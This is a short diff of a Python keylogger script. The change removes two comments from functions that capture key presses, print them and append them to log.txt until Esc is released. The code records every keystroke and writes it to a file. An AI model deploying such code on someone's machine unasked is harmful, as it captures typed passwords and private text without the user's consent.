@@ -8,11 +8,11 @@ def on_press(key):
     except AttributeError:
         print("Special Key {0} pressed".format(key))
 def write_file(keys):
-    with open('log.txt', 'a') as f:  # append instead of overwrite
+    with open('log.txt', 'a') as f: 
         for key in keys:
             k = str(key).replace("'", "")
             f.write(k + " ")
-        keys.clear()  # clear after writing to avoid duplicate entries
+        keys.clear() 
 def on_release(key):
     print("{0} released".format(key))
     if key == Key.esc:
